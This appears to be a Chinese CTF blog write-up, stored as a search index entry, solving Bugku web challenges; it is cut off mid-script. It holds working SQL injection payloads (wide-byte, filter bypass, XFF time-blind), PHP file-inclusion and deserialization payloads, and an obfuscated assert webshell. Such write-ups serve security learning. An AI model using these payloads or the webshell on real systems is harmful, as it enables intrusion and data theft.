<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[bugku-web-Writeup]]></title>
    <url>%2F2018%2F07%2F13%2Fbugku-web-Writeup%2F</url>
    <content type="text"><![CDATA[慢慢刷了这么多题目，需要总结一下 web2 听说聪明的人都能找到答案http://120.24.86.145:8002/web2/ 查看源代码即可发现，F12 KEY{Web-2-bugKssNNikls9100} 文件上传测试 http://103.238.227.13:10085/ Flag格式：Flag:xxxxxxxxxxxxx bp抓包改content-type为image/jpeg就行了 Flag:42e97d465f962c53df9549377b513c7e 计算器 地址：http://120.24.86.145:8002/yanzhengma/ 输入的时候发现只能输入一位数字，F12修改maxlength即可 flag{CTF-bugku-0032} web3 flag就在这里快来找找吧 http://120.24.86.145:8002/web3/ 查看源代码，在最后发现 &#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&amp;#125 熟悉的同学就知道这是Unicode编码，Unicode解密一下就得到key Unicode解码网址：http://tool.chinaz.com/tools/unicode.aspx KEY{J2sa42ahJK-HS11III} sql注入 http://103.238.227.13:10083/ 格式KEY{} 进来一看 查询key表,id=1的string字段 ，这个应该就是flag了 查看源代码，发现是gb2312，想到宽字节注入 1&lt;meta charset=&quot;gb2312&quot; /&gt; 尝试一下，得到下面报错 1?id=1%df%27 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1運’’ LIMIT 1’ at line 1 获得数据库 sql5 12http://103.238.227.13:10083/index.php?id=1%df%27 union select user(),database() %23 获得表 key，test 1?id=1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema =database() %23 获得列 id ,string( 0x6b6579 是 key的16进制) 1?id=1%df%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x6b6579 %23 获得string 1?id=1%df%27 union select 1,group_concat(string) from sql5.key %23 KEY{54f3320dc261f313ba712eb3f13a1f6d } 域名解析 听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag windows下修改域名解析的 文件为： c:\windows\system32\drivers\etc\hosts 加上后访问flag.bugku.com就可以拿到flag KEY{DSAHDSJ82HDS2211} 配置windows下域名解析 SQL注入1 地址：http://103.238.227.13:10087/ 提示：过滤了关键字 你能绕过他吗 flag格式KEY{xxxxxxxxxxxxx} 访问参数为：?id=x 查找表为key的数据表，id=1值hash字段值 题目意思是要找数据表key的hash字段 1234567891011121314//过滤sql$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit('包含敏感关键字！'.$value); &#125;&#125;//xss过滤$id = strip_tags($id);$query = "SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1"; 分析一下过滤代码，一看过滤了union，select，这还怎么玩，看下去发现有个strip_tags($id)，去查了查这个函数 strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。 http://www.w3school.com.cn/php/func_string_strip_tags.asp http://php.net/strip_tags 可以玩了，可以在敏感关键字中加入HTML标记，绕过关键字过滤，然后再经过strip_tags()函数还原为select等待 例如： 1sele&lt;a&gt;ct selec&lt;p&gt;t strip_tags()之后 1select 也可以用%00 获得数据库 sql3 1id=1 uni&lt;a&gt;on selec&lt;a&gt;t 1,database() %23 获得表 hash,key,temp 1id=1 unio&lt;a&gt;n sele&lt;a&gt;ct 1,gr&lt;a&gt;oup_concat(tabl&lt;a&gt;e_name) fro&lt;a&gt;m info&lt;a&gt;rmation_schema.tab&lt;a&gt;les where tab&lt;a&gt;le_schema =database() %23 获得hash 1id=1 unio&lt;a&gt;n sele&lt;a&gt;ct 1,gr&lt;a&gt;oup_concat(hash) fro&lt;a&gt;m sql3.key %23 KEY{c3d3c17b4ca7f791f85e#$1cc72af274af4adef} 你必须让他停下 地址：http://120.24.86.145:8002/web12/ 作者：@berTrAM bp抓几次包，repeat几次就拿到了 flag{dummy_game_1s_s0_popular} 本地包含 地址：http://120.24.86.145:8003/ 变量1 http://120.24.86.145:8004/index1.php 12345678910111213flag In the variable ! &lt;?php error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; die("args error!"); &#125; eval("var_dump($$args);");&#125;?&gt; 其中preg_match正则表达式的 意思是，匹配字符串，\w表示字符+数字+下划线，*代表有若干个\w字符组成。如果不匹配会输出 ‘’args error!‘’\ 正则表达式手册 而下一句的$$args,比较有意思。解析一下，PHP中变量可以当作另一个变量的变量名。例如 12345&lt;?php$a='b';$b="Boogle";eval("var_dump($$a);"); //输出 Boogle?&gt; 再看第一句提示： 12flag In the variable ! //flag 在变量中。 那么结合两者，可以想到一个很有意思的变量－－－－$GLOBALS：一个包含了全部变量的全局组合数组。 构造payloaｄ：?args=BLOBLAS 即可爆出所有变量，其中包含flag 1array(7) &#123; [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_GET&quot;]=&gt; array(1) &#123; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;ZFkwe3&quot;]=&gt; string(38) &quot;flag&#123;92853051ab894a64f7865cf3c2128b34&#125;&quot; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; flag{92853051ab894a64f7865cf3c2128b34} bugku ctf平台之变量1 write up web5 JSPFUCK??????答案格式CTF{\} http://120.24.86.145:8002/web5/ 字母大写 查看一下源代码，发现JSFUCK，直接F12在控制台运行一下就出来了 CTF{whatfk} 头等舱 http://120.24.86.145:9009/hd.php 发现啥都没有，那就抓个包看看吧 flag{Bugku_k8_23s_istra} flag在index里 http://120.24.86.145:8005/post/ 点进去看见有file=show.php，本地文件包含 payload: http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php 读取得 PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg== 123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data"))&#123; echo "Oh no!"; exit(); &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; flag:flag{edulcni_elif_lacol_si_siht} web4 看看源代码吧 http://120.24.86.145:8002/web4/ JavaScript unescape() 函数 该函数的工作原理是这样的：通过找到形式为 %xx 和 %uxxxx 的字符序列（x 表示十六进制的数字），用 Unicode 字符 \u00xx 和 \uxxxx 替换这样的字符序列进行解码。 1%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62%35%34%61%61%32%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b url解码一下 12345678910111213141516171819function checkSubmit() &#123; var a = document.getElementById("password"); if ("undefined" != typeof a) &#123; if ("67d709b2b54aa2aa648cf6e87a7114f1" == a.value) return !0; alert("Error"); a.focus(); return !1 &#125;&#125;document.getElementById("levelQuest").onsubmit = checkSubmit; KEY{J22JK-HS11} 输入密码查看flag http://120.24.86.145:8002/baopo/ 作者：Se7en 提示说是五位数密码，那就用bp爆破一下吧 设置好之后点start attack 在pwd=13579的时候返回flag flag{bugku-baopo-hah} 点击一百万次 http://120.24.86.145:9001/test/ hints:JavaScript 查看源代码 12345678910111213141516171819var clicks=0 $(function() &#123; $("#cookie") .mousedown(function() &#123; $(this).width('350px').height('350px'); &#125;) .mouseup(function() &#123; $(this).width('375px').height('375px'); clicks++; $("#clickcount").text(clicks); if(clicks &gt;= 1000000)&#123; var form = $('&lt;form action="" method="post"&gt;' + '&lt;input type="text" name="clicks" value="' + clicks + '" hidden/&gt;' + '&lt;/form&gt;'); $('body').append(form); form.submit(); &#125; &#125;); &#125;); 当clicks&gt;1000000时，post clicks参数过去 flag{Not_C00kI3Cl1ck3r} 备份是个好习惯 http://120.24.86.145:8002/web16/ 听说备份是个好习惯 尝试一波备份的文件名，尝试index.php.bak的时候成功了，下载下来拿到源码 123456789101112131415161718192021&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125;?&gt; 这代码看起来很熟悉的样子，不就是校赛的md5么 payload http://120.24.86.145:8002/web16/index.php?kekeyy1[]=1&amp;kekeyy2[]=0 Bugku{OH_YOU_FIND_MY_MOMY} 成绩单 快来查查成绩吧 http://120.24.86.145:8002/chengjidan/ 1234567id=1&apos; order by 4 %23id=-1&apos; union select 1,database(),user(),4 %23id=-1&apos; union select 1,group_concat(table_name) ,user(),4 from information_schema.tables where table_schema = database()%23id=-1&apos; union select 1,group_concat(skctf_flag) ,user(),4 from fl4g %23 秋名山老司机 http://120.24.86.145:8002/qiumingshan/ 是不是老司机试试就知道。 1234567891011import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'for i in range(10): s = requests.Session() source = s.get(url) expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group() # print(expression) result = eval(expression) data = &#123;'value': result&#125; print(s.post(url,data=data).text) http://www.bugku.com/thread-1057-1-1.html https://blog.csdn.net/EustiaSora/article/details/79142835 python字符串切割：str.split()和re.split()对比 速度要快 速度要快！！！！！！ http://120.24.86.145:8002/web6/ 格式KEY{xxxxxxxxxxxxxx} 抓包发现返回报头有flag字段 12345678910111213141516171819202122232425262728#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/5/24 0:02# @Author : Lhaihai# @File : bugku-web6.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description :"""import requestsimport base64url = 'http://120.24.86.145:8002/web6/'session = requests.Session()r = session.get(url)get = str(r.headers['flag'])print(get)flag = base64.b64decode(str(r.headers['flag']))flag = base64.b64decode(str(flag).split(':')[1][1:-1])# print(str(flag).split(':')[1][1:-1])print(str(flag)[2:-1])data = &#123; 'margin': str(flag)[2:-1]&#125;r = session.post(url,data=data)print(r.text) 详解 CTF Web 中的快速反弹 POST 请求cookies欺骗 http://120.24.86.145:8002/web11/ 答案格式：KEY{xxxxxxxx} 注意到URL为 http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ= a2V5cy50eHQ= base64解码得 keys.txt 于是index.phpbase64编码为aW5kZXgucGhw 于是一句一句的复制出来 1234567891011121314151617&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array( '0' =&gt;'keys.txt', '1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; $file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line]; &#125;?&gt; 分析一波代码， 当cookie存在margin并且margin=margin时，file_list[2]赋值为keys.php 123if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; $file_list[2]='keys.php';&#125; 当file在file_list中存在时，才会输出文件内容 12345if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line]; &#125;?&gt; 于是 keys.php base64编码为 a2V5cy5waHA= 在cookie加上magin=margin，就可以拿到KEY KEY{key_keys} XSS http://103.238.227.13:10089/ Flag格式:Flag:xxxxxxxxxxxxxxxxxxxxxxxx 首先我们查看源代码 发现可以通过xss注入 所以我们只需将&lt;和&gt;转义即可 于是我们构造 1?id=\u003cscript\u003ealert(_key_)\u003c/script\u003e 即可获得flag Flag:17f094325e90085b30a5ddefce34acd8 never give up http://120.24.86.145:8006/test/hello.php 作者：御结冰城 查看源代码，发现有注释 访问view-source:http://120.24.86.145:8006/test/1p.html 有一段JavaScript代码 123456789101112&lt;!--var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt; %3D是=，于是把Words这一串先url解码 12&lt;script&gt;window.location.href=&apos;http://www.bugku.com&apos;;&lt;/script&gt; &lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt; 再把注释起来的字符串base64解码，解码发现有很多%22之类的，再url解码一下得到php代码 12345678910111213141516171819202122232425";if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("f4l2a3g.txt");&#125;else&#123; print "never never never give up !!!";&#125;?&gt; eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。 具体分析这篇博客讲得很清楚，奉上链接 https://ciphersaw.me/2017/12/26/%E3%80%90Bugku%20CTF%E3%80%91%20Web%20%E2%80%94%E2%80%94%20never%20give%20up/ CTF之PHP黑魔法总结 payload 120.24.86.145:8006/test/hello.php?id=.&amp;b=%0012345&amp;a=php://input bugku is a nice plateform! flag{tHis_iS_THe_fLaG} welcome to bugkuctf http://120.24.86.145:8006/test1/ 作者：pupil 解析WriteUp：【Bugku CTF】 Web —— welcome to bugkuctf 查看源代码发现 12345678910$user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; payload /test1/?file=php://filter/read=convert.base64-encode/resource=hint.php&amp;txt=php://input post请求：welcome to the bugkuctf base64解码得 hint.php 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; 同理拿到index.php源码 index.php 123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "不能现在就给你flag哦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; payload /test1/?file=hint.php&amp;txt=php://input&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} flag{php_is_the_best_language} 过狗一句话 http://120.24.86.145:8010/ 送给大家一个过狗一句话 1234&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; payload: http://120.24.86.145:8010/?s=print_r(scandir(&#39;./&#39;)); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748Array( [0] =&gt; . [1] =&gt; .. [2] =&gt; 1.php [3] =&gt; 123.txt [4] =&gt; 2.php [5] =&gt; 3.php [6] =&gt; 4.php [7] =&gt; 5.php [8] =&gt; &lt;?php eval( [9] =&gt; &lt;?php eval($_POST[1]) [10] =&gt; &lt;?php eval(\$_POST[1]) [11] =&gt; README.README [12] =&gt; a.php [13] =&gt; a.txt [14] =&gt; c.php [15] =&gt; chaoba [16] =&gt; chaoba.aspx [17] =&gt; chaoba1.php [18] =&gt; chaoba2.php [19] =&gt; conn [20] =&gt; ddee.php [21] =&gt; f.html [22] =&gt; f.php [23] =&gt; flag.txt [24] =&gt; h.php [25] =&gt; haha.php [26] =&gt; index.php [27] =&gt; ldl.txt [28] =&gt; ll.php [29] =&gt; loshell.php [30] =&gt; olivia.txt [31] =&gt; oudeniu.php [32] =&gt; phpspy1.php [33] =&gt; q.php [34] =&gt; t2.php [35] =&gt; testfile.txt [36] =&gt; txxxc.php [37] =&gt; x.php [38] =&gt; xb.php [39] =&gt; xxoo.php [40] =&gt; xxoos.php [41] =&gt; xxx.php [42] =&gt; zaizheliflag.txt [43] =&gt; zx.php)¿ÓµùµÄÌâÄ¿£¬To JBfei£¡ 访问flag.txt BUGKU{bugku_web_009801_a} 字符？正则？ 字符？正则？ http://120.24.86.145:8002/web10/ 12345678&lt;?php highlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match("/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);if( $IM )&#123; die('key is: '.$key);&#125;?&gt; 就是考察正则表达式了 1.表达式直接写出来的字符串直接利用，如key2.“.”代表任意字符3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以’^’开头，以’$’结束4.“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束5.[a-z]代表a-z中的任意一个字符6.[[:punct:]]代表任意一个字符，包括各种符号，记得是符号7./i代表大小写不敏感8.{4-7}代表[0-9]中数字连续出现的次数是4-7次9.\s匹配任意的空白符10.\d 匹配数字11.\b 匹配单词的开始或结束 payload ?id=key1key1111key:/a/keya! KEY{0x0SIOPh550afc} 参考： 正则手册 字符？正则？ 前女友(SKCTF) http://118.89.219.210:49162/ flag格式：SKCTF{xxxxxxxxxxxxxxxxxx} 查看源代码发现 点击code.txt 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; md5函数漏洞和strcmp数组绕过 payload ?v1[]=0&amp;v2[]=1&amp;v3[] SKCTF{Php_1s_tH3_B3St_L4NgUag3} login1(SKCTF) http://118.89.219.210:49163/flag格式：SKCTF{xxxxxxxxxxxxxxxxx}hint:SQL约束攻击 约束攻击又称为长字节截断攻击 原理： 在mysql数据库中当插入某个字段的值超过了预设的长度,mysql会自动造成截断 比如数据库user字段的类型为 varchar(8) 当插入user的值为 admin 1，password=123456时 会插入一个用户名为admin，密码为123456的用户，就成功创建了一个admin用户 注册一个 admin 1 ABCabc123 登录一下拿到flag SKCTF{4Dm1n_HaV3_GreAt_p0w3R} 你从哪里来 http://120.24.86.145:9009/from.php 修改一下请求报头的referer payload Referer: https://www.google.com flag{bug-ku_ai_admin} md5 collision(NUPT_CTF) http://120.24.86.145:9009/md5.php PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107QNKCDZO0e830400451993494058024219903391 s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s1885207154a0e509367213418206700842008763514 s1502113478a0e861580163291561247404381396064 s1885207154a0e509367213418206700842008763514 s1836677006a0e481036490867661113260034900752 s155964671a0e342768416822451524974117254469 s1184209335a0e072485820392773389523109082030 s1665632922a0e731198061491163073197128363787 s1502113478a0e861580163291561247404381396064 s1836677006a0e481036490867661113260034900752 s1091221200a0e940624217856561557816327384675 s155964671a0e342768416822451524974117254469 s1502113478a0e861580163291561247404381396064 s155964671a0e342768416822451524974117254469 s1665632922a0e731198061491163073197128363787 s155964671a0e342768416822451524974117254469 s1091221200a0e940624217856561557816327384675 s1836677006a0e481036490867661113260034900752 s1885207154a0e509367213418206700842008763514 s532378020a0e220463095855511507588041205815 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s214587387a0e848240448830537924465865611904 s1502113478a0e861580163291561247404381396064 s1091221200a0e940624217856561557816327384675 s1665632922a0e731198061491163073197128363787 s1885207154a0e509367213418206700842008763514 s1836677006a0e481036490867661113260034900752 s1665632922a0e731198061491163073197128363787 s878926199a0e545993274517709034328855841020 payload http://120.24.86.145:9009/md5.php?a=s878926199a flag{md5_collision_is_easy} 各种绕过 各种绕过哟 http://120.24.86.145:8002/web7/ 12345678910111213141516171819&lt;?php highlight_file('flag.php'); $_GET['id'] = urldecode($_GET['id']); $flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'; if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!'; &#125; ?&gt; 又是md5，数组大法好 payload http://120.24.86.145:8002/web7/index.php?uname[]=0&amp;id=margin passwd[]=1 flag{HACK_45hhs_213sDD} web8 txt？？？？ http://120.24.86.145:8002/web8/ 123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; payload http://120.24.86.145:8002/web8/?ac=123456&amp;fn=php://input 123456 flag{3cfb7a90fc0de31} 求getshell​ 1. 把请求头里面的Content-Type字母改成大写进行绕过 ​ 2. .jpg后面加上.php5其他的都被过滤了好像.. 参考链接 https://blog.csdn.net/qq_40424939/article/details/80767321 INSERT INTO注入 地址：http://120.24.86.145:8002/web15/ flag格式：flag{xxxxxxxxxxxx} 不如写个Python吧 123456789101112131415161718192021222324252627error_reporting(0);function getIp()&#123;$ip = '';if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123;$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;else&#123;$ip = $_SERVER['REMOTE_ADDR'];&#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host="localhost";$user="";$pass="";$db="";$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");mysql_select_db($db) or die("Unable to select database");$ip = getIp();echo 'your ip is :'.$ip;$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql); XFF可以注入，过滤了’,’时间盲注，两个trick逗号过滤的情况下可以使用 1select case when xxx then xxx else xxx end substr的逗号可以用如下姿势 1from x for 1 最终可以构造如下payload,注意末尾多一个括号闭合之前的括号 1127.0.0.1&apos;+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)=&apos;&#123;1&#125;&apos;) then sleep(5) else 1 end)) # 上一个最终的注入脚本 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/7/12# @Author : Lhaihai# @File : 